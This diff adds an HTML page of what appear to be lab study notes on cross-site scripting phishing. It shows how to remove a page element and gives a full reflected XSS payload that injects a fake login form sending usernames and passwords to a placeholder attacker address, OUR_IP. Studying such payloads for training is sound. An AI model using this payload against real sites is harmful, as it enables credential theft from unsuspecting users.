@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>3. Cleaning Up: remove from the page other content that is not our payload</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>3. Cleaning Up: remove from the page other content that is not our payload</h1><br/>3. Cleaning Up: remove from the page other content that is not our payload<br />   1) we can use the JavaScript function <strong>document.getElementById(&quot;[ID_TO_REMOVE]&quot;).remove()</strong> function<br />   2) To find the id of the HTML element we want to remove, we can open the Page Inspector Picker by clicking and then clicking on the element we need<br />   		<a href=""><img src="images/2467-1.png" alt="images/2467-1.png" /></a><br />	3) add the remove method <strong>document.getElementById(&#39;urlform&#39;).remove();	</strong>at the end of our payload<br />    <div class="codebox"><pre>url=&#39;&gt;&lt;script&gt;document.write(&#39;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;&#39;);document.getElementById(&#39;urlform&#39;).remove();&lt;/script&gt;&lt;img+src=&#39;</pre></div><br />	<a href=""><img src="images/2467-2.png" alt="images/2467-2.png" /></a><br />	As we can see the URL form is been removed</div>
+</body>
+</html>
